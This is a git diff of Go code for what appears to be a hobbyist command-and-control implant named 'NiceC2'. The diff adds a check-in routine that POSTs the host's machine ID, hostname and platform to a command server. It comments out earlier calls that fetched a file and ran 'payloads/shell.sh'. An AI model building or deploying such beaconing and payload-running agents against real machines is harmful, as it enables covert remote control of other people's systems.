@@ -11,10 +11,8 @@ import (
 	"net/http"
 	"os"
 	"os/exec"
-	"path/filepath"
 	"runtime"
 	"strings"
-	"time"
 
 	"github.com/denisbrodbeck/machineid"
 	// "github.com/mitchellh/go-homedir"
@@ -32,6 +30,10 @@ type CheckIn struct {
 	ID       string `json:"ID"`
 	Hostname string `json: "Hostname"`
 	Platform string `json:"Platform"`
+}
+
+type CheckIn_response struct {
+	Message string `json:"message"`
 }
 
 type command struct {
@@ -66,49 +68,94 @@ func main() {
 
 	NodeID, _ = machineid.ID()
 
-	old_checkIn()
+	// old_checkIn()
 
-	getFIle()
+	// getFIle()
 
-	scriptOutput := run_script("payloads/shell.sh")
+	// scriptOutput := run_script("payloads/shell.sh")
 
-	fmt.Println(scriptOutput)
+	// fmt.Println(scriptOutput)
 
-	// Get's the current time, and formats it. god this is weird
-	current_time := time.Now().Format("2006.01.02 15:04:05")
+	checkIn()
 
-	var home string
-	home, _ = os.UserHomeDir()
+	// // Get's the current time, and formats it. god this is weird
+	// current_time := time.Now().Format("2006.01.02 15:04:05")
 
-	var testFile string
-	testFile = filepath.Join(home, "Desktop", "NiceC2 Log file.txt")
+	// var home string
+	// home, _ = os.UserHomeDir()
 
-	fmt.Println(testFile)
+	// var testFile string
+	// testFile = filepath.Join(home, "Desktop", "NiceC2 Log file.txt")
 
-	// Opens/creates the file in a way that it can be appended to
-	file, err := os.OpenFile(testFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
+	// fmt.Println(testFile)
 
-	// Error if you can't open/edit the file
+	// // Opens/creates the file in a way that it can be appended to
+	// file, err := os.OpenFile(testFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
+
+	// // Error if you can't open/edit the file
+	// if err != nil {
+	// 	fmt.Println("Could not open example.txt")
+	// 	return
+	// }
+
+	// defer file.Close()
+
+	// _, err2 := file.WriteString("The time is: " + current_time + "\n")
+
+	// if err2 != nil {
+	// 	fmt.Println("Could not write text to example.txt")
+
+	// } else {
+	// 	fmt.Println("Operation successful! Text has been appended to example.txt")
+	// }
+
+	// // // Sleeps 10 seconds, then does it again. Damn look at that recursion
+	// // time.Sleep(10 * time.Second)
+	// // main()
+
+}
+
+func checkIn() {
+
+	// Getting the info
+	hostname, _ := os.Hostname()
+	platform := runtime.GOOS
+
+	data := map[string]string{"ID": NodeID, "Hostname": hostname, "Platform": platform}
+
+	json_data, err := json.Marshal(data)
 	if err != nil {
-		fmt.Println("Could not open example.txt")
-		return
+		log.Fatal(err)
 	}
 
-	defer file.Close()
-
-	_, err2 := file.WriteString("The time is: " + current_time + "\n")
-
-	if err2 != nil {
-		fmt.Println("Could not write text to example.txt")
-
-	} else {
-		fmt.Println("Operation successful! Text has been appended to example.txt")
+	r, err := http.NewRequest("POST", command_server+"/checkin", bytes.NewBuffer(json_data))
+	if err != nil {
+		panic(err)
 	}
 
-	// // Sleeps 10 seconds, then does it again. Damn look at that recursion
-	// time.Sleep(10 * time.Second)
-	// main()
+	// Add the header to say that it's json
+	r.Header.Add("Content-Type", "application/json")
 
+	//Create a client to send the data and then send it
+	client := &http.Client{}
+	res, err := client.Do(r)
+	if err != nil {
+		panic(err)
+	}
+
+	//shrug
+	defer res.Body.Close()
+
+	fmt.Println(res.StatusCode)
+	// fmt.Println(string(res.Body))
+
+	post := &CheckIn_response{}
+	derr := json.NewDecoder(res.Body).Decode(post)
+	if derr != nil {
+		panic(derr)
+	}
+
+	fmt.Println(post.Message)
 }
 
 func old_checkIn() {
